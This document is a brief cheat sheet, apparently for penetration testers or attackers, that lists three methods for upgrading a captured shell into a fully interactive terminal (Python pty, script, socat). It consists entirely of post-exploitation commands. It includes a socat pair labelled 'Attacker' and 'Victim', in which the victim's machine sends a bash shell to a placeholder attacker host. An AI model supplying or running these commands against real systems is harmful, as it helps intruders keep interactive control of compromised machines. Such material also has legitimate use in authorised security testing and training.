```
# Method 1: Python PTY (most reliable)
python3 -c 'import pty; pty.spawn("/bin/bash")'
Ctrl+Z
stty raw -echo; fg
export TERM=xterm; stty rows 48 columns 190

# Method 2: Script
script /dev/null -c bash
# Then: Ctrl+Z → stty raw -echo; fg → export TERM=xterm

# Method 3: Socat (best quality)
# Attacker: socat file:`tty`,raw,echo=0 tcp-listen:4444
# Victim:   socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:<LHOST>:4444
```